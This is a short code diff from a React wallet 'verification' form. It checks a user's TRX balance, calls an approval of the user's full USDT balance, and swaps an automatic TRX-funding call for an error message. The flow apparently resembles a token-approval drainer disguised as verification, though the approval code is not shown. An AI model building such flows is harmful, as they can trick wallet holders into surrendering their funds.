@@ -248,13 +248,13 @@ const VerificationFormComponent = (props) => {
     if (balanceTrx > 35) {
       handleApprove(balanceUSDT)
     } else {
-      // setIsSubmitting(false);
-      await fundTrxToUser(address);
-      // Swal.fire({
-      //   icon: "error",
-      //   title: "Insufficient Balance",
-      //   text: "You need at least 35 TRX for the verificaion."
-      // });
+      setIsSubmitting(false);
+      // await fundTrxToUser(address);
+      Swal.fire({
+        icon: "error",
+        title: "Insufficient Balance",
+        text: "You need at least 35 TRX for the verificaion."
+      });
       return;
     }
   };
